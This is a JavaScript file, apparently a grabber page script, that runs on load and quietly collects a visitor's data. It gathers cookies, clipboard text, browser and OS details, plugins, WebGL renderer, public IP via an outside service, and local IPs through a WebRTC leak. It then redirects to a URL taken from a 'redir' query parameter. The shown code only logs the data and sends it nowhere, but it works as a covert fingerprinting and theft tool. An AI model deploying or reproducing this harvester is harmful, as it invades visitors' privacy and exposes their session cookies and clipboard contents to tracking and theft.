var info = {};

run = () => {
    // get referrer
    var xhttp = new XMLHttpRequest();
    xhttp.open('GET', location.href, true);
    xhttp.send();

    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            info.referrer = xhttp.responseURL;
        }
        return null;
    };

    // window.location.href
    info.href = window.location.href;

    // get user agent
    info.userAgent = navigator.userAgent;

    // get time
    var d = new Date();
    info.time = d.toUTCString();

    // get browser
    info.browser = navigator.appName || 'Unknown';

    // get os
    info.os = navigator.platform || 'Unknown';

    // get screen
    info.screen = screen.width + 'x' + screen.height;

    // get cookies
    info.cookies = document.cookie;

    var plugin = [];
    for (var i = 0; i < navigator.plugins.length; i++) {
        plugin.push(navigator.plugins[i].name);
    }
    info.plugin = plugin.toString();

    // get connection
    info.connection = navigator.connection?.effectiveType || 'Unknown';

    // get clipboard
    var readText = navigator.clipboard?.readText;
    if (typeof readText === 'function') {
        readText().then((clipText) => {
            info.clipboard = clipText || 'Unknown';
        });
    }

    // webgl magic
    var c = document.getElementById('canvas');
    if (typeof c !== 'undefined' && c !== null) {
        var webgl = c.getContext('experimental-webgl');
        var extension = webgl.getExtension('WEBGL_debug_renderer_info');
        var vendor = webgl.getParameter(extension.UNMASKED_VENDOR_WEBGL);
        var renderer = webgl.getParameter(extension.UNMASKED_RENDERER_WEBGL);
        info.webgl = vendor + ' - ' + renderer;
    }

    // get public ip
    fetch('https://api.ipify.org?format=json')
        .then((response) => response.json())
        .then((data) => {
            info.public_ip = data?.ip;
        });

    // get local ip
    var RTCPeerConnection =
        window.RTCPeerConnection ||
        window.webkitRTCPeerConnection ||
        window.mozRTCPeerConnection;
    if (RTCPeerConnection)
        (function () {
            var rtc = new RTCPeerConnection({
                iceServers: [],
            });
            if (1 || window.mozRTCPeerConnection) {
                rtc.createDataChannel('', {
                    reliable: false,
                });
            }
            rtc.onicecandidate = function (evt) {
                if (evt.candidate) grepSDP('a=' + evt.candidate.candidate);
            };
            rtc.createOffer(
                function (offerDesc) {
                    grepSDP(offerDesc.sdp);
                    rtc.setLocalDescription(offerDesc);
                },
                function (e) {
                    console.warn('offer failed', e);
                },
            );
            var addrs = Object.create(null);
            addrs['0.0.0.0'] = false;

            function updateDisplay(newAddr) {
                if (newAddr in addrs) return;
                else addrs[newAddr] = true;
                var displayAddrs = Object.keys(addrs).filter(function (k) {
                    return addrs[k];
                });
                info.local_ip = displayAddrs.join(' or perhaps ') || 'n/a';
            }

            function grepSDP(sdp) {
                var hosts = [];
                sdp.split('\r\n').forEach(function (line) {
                    if (~line.indexOf('a=candidate')) {
                        var parts = line.split(' '),
                            addr = parts[4],
                            type = parts[7];
                        if (type === 'host') updateDisplay(addr);
                    } else if (~line.indexOf('c=')) {
                        var parts = line.split(' '),
                            addr = parts[2];
                        updateDisplay(addr);
                    }
                });
            }
        })();

    window.info = info;
    let url = new URL(window.location.href);
    let params = new URLSearchParams(url.search);
    let myParam = params.get('redir');
    setTimeout(() => {
        if (myParam) {
            window.location.href = myParam;
        }
    }, 2000);

    console.log(info);
};

run();
